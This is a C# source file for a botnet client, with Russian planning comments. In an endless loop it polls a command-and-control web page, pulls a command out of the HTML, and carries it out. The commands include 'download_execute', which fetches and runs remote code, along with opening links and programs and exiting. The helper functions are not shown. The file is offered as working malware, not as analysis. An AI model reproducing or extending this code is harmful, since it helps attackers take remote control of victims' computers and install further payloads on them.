using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;

namespace BotNet
{
    class cMain
    {
        static string last_cmd = string.Empty;

        static void Main(string[] args)
        {
            //Загрузить страницу в переменную
            //Спарсить комманду
            //Обработать и выполнить её
            //Сделать постоянную проверку в цикле

            while (true)
            {
                string html = Web.GetHTML(Configs.server);

                // <p>cmd{*}cmd_content</p></article>
                Match regx = Regex.Match(html, "<p>(.*)</p></article>");
                string content = regx.Groups[1].Value;

                if(last_cmd == content)
                {
                    Thread.Sleep(Configs.delay);
                    continue;
                }
                last_cmd = content;

                cmd command = new cmd(content);
                Execute(command);

                Thread.Sleep(Configs.delay);
            }
        }

        static void Execute(cmd CMD)
        {
            switch (CMD.ComType)
            {
                case "open_link":
                    Functions.OpenLink(CMD.ComContent);
                    break;

                case "download_execute":
                    Functions.DownloadExecute(CMD.ComContent);
                    break;

                case "open_program":
                    Functions.OpenProgram(CMD.ComContent);
                    break;

                case "Test":
                    Functions.Test(CMD.ComContent);
                    break;

                case "exit":
                    Environment.Exit(0);
                    break;
            }
        }
    }
}
